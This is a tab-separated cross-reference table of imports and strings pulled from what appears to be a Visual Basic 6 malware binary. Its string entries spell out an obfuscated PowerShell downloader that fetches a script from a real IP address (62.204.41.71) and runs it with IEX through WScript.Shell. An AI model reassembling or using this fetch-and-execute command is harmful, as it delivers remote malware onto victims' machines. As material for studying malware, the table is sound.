reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40131e	0x401070	import	0x40131e	MSVBVM60.DLL.ThunRTMain
0x401324	0x4013a4	string	0x40131e	VB5!
0x401e4a	0x401e4c	string	0x40131e	__vbaLateMemCall
0x401f5e	0x401020	import	0x401f10	MSVBVM60.DLL.__vbaOnError
0x401f6b	0x401710	string	0x401f10	W{NAN}{NAN}Sc{NAN}{NAN}r{NAN}{NAN}ip{NAN}t.Sh{NAN}{NAN}e{NAN}{NAN}l{NAN}l
0x401f88	0x401080	import	0x401f10	MSVBVM60.DLL.__vbaVarCopy
0x401fb0	0x401058	import	0x401f10	MSVBVM60.DLL.__vbaStrVarVal
0x401fb7	0x401044	import	0x401f10	MSVBVM60.DLL.rtcReplace
0x401fd6	0x401008	import	0x401f10	MSVBVM60.DLL.__vbaVarMove
0x401fe2	0x401094	import	0x401f10	MSVBVM60.DLL.__vbaFreeStr
0x401ffc	0x401058	import	0x401f10	MSVBVM60.DLL.__vbaStrVarVal
0x40200a	0x401050	import	0x401f10	MSVBVM60.DLL.rtcCreateObject2
0x40201e	0x401074	import	0x401f10	MSVBVM60.DLL.__vbaVarSetVar
0x40202a	0x401094	import	0x401f10	MSVBVM60.DLL.__vbaFreeStr
0x402037	0x4017c0	string	0x401f10	p{NAN}{NAN}o{NAN}{NAN}we{NAN}{NAN}rs{NAN}{NAN}he{NAN}{NAN}l{NAN}{NAN}l
0x402054	0x401080	import	0x401f10	MSVBVM60.DLL.__vbaVarCopy
0x402061	0x401854	string	0x401f10	$c1='{NAN}(N{NAN}{NAN}e{NAN}w-{NAN}Ob{NAN}{NAN}je{NAN}{NAN}c{NAN}t N{NAN}{NAN}e{NAN}t.W{NAN}e';
0x40207e	0x401080	import	0x401f10	MSVBVM60.DLL.__vbaVarCopy
0x40208b	0x40191c	string	0x401f10	$c4='b{NAN}{NAN}Cli{NAN}{NAN}en{NAN}{NAN}t{NAN}).Do{NAN}{NAN}wn{NAN}{NAN}l{NAN}o';
0x4020a8	0x401080	import	0x401f10	MSVBVM60.DLL.__vbaVarCopy
0x4020b5	0x4019d8	string	0x401f10	$c3='a{NAN}dS{NAN}{NAN}t{NAN}ri{NAN}{NAN}n{NAN}g{NAN}(''h{NAN}tt{NAN}p:/{NAN}/62.204.41.71/cs/SkyDrive.oo''){NAN}';
0x4020d5	0x401080	import	0x401f10	MSVBVM60.DLL.__vbaVarCopy
0x402102	0x401080	import	0x401f10	MSVBVM60.DLL.__vbaVarCopy
0x40212f	0x401080	import	0x401f10	MSVBVM60.DLL.__vbaVarCopy
0x40213c	0x401b40	string	0x401f10	IEX $TC |IEX
0x40215c	0x401080	import	0x401f10	MSVBVM60.DLL.__vbaVarCopy
0x402184	0x401058	import	0x401f10	MSVBVM60.DLL.__vbaStrVarVal
0x40218b	0x401044	import	0x401f10	MSVBVM60.DLL.rtcReplace
0x4021aa	0x401008	import	0x401f10	MSVBVM60.DLL.__vbaVarMove
0x4021b6	0x401094	import	0x401f10	MSVBVM60.DLL.__vbaFreeStr
0x4021d2	0x40107c	import	0x401f10	MSVBVM60.DLL.__vbaVarAdd
0x4021e7	0x40107c	import	0x401f10	MSVBVM60.DLL.__vbaVarAdd
0x4021fc	0x40107c	import	0x401f10	MSVBVM60.DLL.__vbaVarAdd
0x402211	0x40107c	import	0x401f10	MSVBVM60.DLL.__vbaVarAdd
0x402226	0x40107c	import	0x401f10	MSVBVM60.DLL.__vbaVarAdd
0x402231	0x401008	import	0x401f10	MSVBVM60.DLL.__vbaVarMove
0x402255	0x401010	import	0x401f10	MSVBVM60.DLL.__vbaFreeVarList
0x40229c	0x40107c	import	0x401f10	MSVBVM60.DLL.__vbaVarAdd
0x4022b1	0x40107c	import	0x401f10	MSVBVM60.DLL.__vbaVarAdd
0x402318	0x401034	import	0x401f10	MSVBVM60.DLL.__vbaObjVar
0x40231f	0x401078	import	0x401f10	MSVBVM60.DLL.__vbaLateMemCall
0x402338	0x401010	import	0x401f10	MSVBVM60.DLL.__vbaFreeVarList
0x40235a	0x401094	import	0x401f10	MSVBVM60.DLL.__vbaFreeStr
0x402385	0x401010	import	0x401f10	MSVBVM60.DLL.__vbaFreeVarList
0x402392	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x40239b	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x4023a4	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x4023ad	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x4023b6	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x4023bf	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x4023cb	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x4023d7	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x4023e3	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x4023ef	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x4023fb	0x40100c	import	0x401f10	MSVBVM60.DLL.__vbaFreeVar
0x40246e	0x401020	import	0x402420	MSVBVM60.DLL.__vbaOnError
0x40247b	0x401710	string	0x402420	W{NAN}{NAN}Sc{NAN}{NAN}r{NAN}{NAN}ip{NAN}t.Sh{NAN}{NAN}e{NAN}{NAN}l{NAN}l
0x402498	0x401080	import	0x402420	MSVBVM60.DLL.__vbaVarCopy
0x4024c0	0x401058	import	0x402420	MSVBVM60.DLL.__vbaStrVarVal
0x4024c7	0x401044	import	0x402420	MSVBVM60.DLL.rtcReplace
0x4024e6	0x401008	import	0x402420	MSVBVM60.DLL.__vbaVarMove
0x4024f2	0x401094	import	0x402420	MSVBVM60.DLL.__vbaFreeStr
0x40250c	0x401058	import	0x402420	MSVBVM60.DLL.__vbaStrVarVal
0x40251a	0x401050	import	0x402420	MSVBVM60.DLL.rtcCreateObject2
0x40252e	0x401074	import	0x402420	MSVBVM60.DLL.__vbaVarSetVar
0x40253a	0x401094	import	0x402420	MSVBVM60.DLL.__vbaFreeStr
0x402547	0x4017c0	string	0x402420	p{NAN}{NAN}o{NAN}{NAN}we{NAN}{NAN}rs{NAN}{NAN}he{NAN}{NAN}l{NAN}{NAN}l
0x402564	0x401080	import	0x402420	MSVBVM60.DLL.__vbaVarCopy
0x402571	0x401854	string	0x402420	$c1='{NAN}(N{NAN}{NAN}e{NAN}w-{NAN}Ob{NAN}{NAN}je{NAN}{NAN}c{NAN}t N{NAN}{NAN}e{NAN}t.W{NAN}e';
0x40258e	0x401080	import	0x402420	MSVBVM60.DLL.__vbaVarCopy
